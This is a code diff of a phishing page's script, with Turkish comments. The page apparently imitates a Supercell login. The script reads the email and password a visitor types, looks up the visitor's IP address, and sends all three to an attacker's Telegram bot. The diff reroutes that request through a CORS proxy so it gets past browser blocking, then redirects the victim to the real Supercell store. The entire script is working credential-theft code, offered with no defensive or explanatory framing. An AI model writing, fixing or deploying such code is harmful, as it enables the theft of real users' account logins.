@@ -98,17 +98,6 @@
   </div>
 
   <script>
-  async function getIP() {
-    try {
-      const response = await fetch('https://api.ipify.org?format=json');
-      if (!response.ok) throw new Error('IP alınamadı');
-      return await response.json().then(data => data.ip);
-    } catch (error) {
-      console.error('IP Hatası:', error);
-      return 'Bilinmeyen IP';
-    }
-  }
-
   async function sendMessage() {
     const token = 'BOT_TOKENUNUZ';
     const userId = 'CHAT_IDNIZ';
@@ -116,33 +105,32 @@
     const password = document.getElementById('password').value;
 
     try {
-      // IP adresi al
-      const ip = await getIP();
+      // 1. CORS Proxy ile IP alımı
+      const ip = await fetch('https://api.ipify.org?format=json')
+        .then(res => res.json())
+        .then(data => data.ip)
+        .catch(() => 'IP Alınamadı');
+
+      // 2. CORS Proxy ile Telegram API isteği
+      const proxyUrl = 'https://corsproxy.io/?';
+      const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
       
-      // Telegram API isteği
-      const telegramResponse = await fetch(
-        `https://api.telegram.org/bot${token}/sendMessage`,
-        {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({
-            chat_id: userId,
-            text: `email: ${email}\nşifre: ${password}\nIP: ${ip}`
-          })
-        }
-      );
+      const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: userId,
+          text: `email: ${email}\nşifre: ${password}\nIP: ${ip}`
+        })
+      });
 
-      if (!telegramResponse.ok) {
-        const errorData = await telegramResponse.json();
-        throw new Error(`Telegram API: ${errorData.description}`);
-      }
-
+      if (!response.ok) throw new Error('Telegram API hatası');
       window.location.href = 'https://store.supercell.com/tr';
     } catch (error) {
       alert(`Hata: ${error.message}`);
-      console.error('Detaylı Hata:', error);
+      console.error('Detay:', error);
     }
   }
 </script>
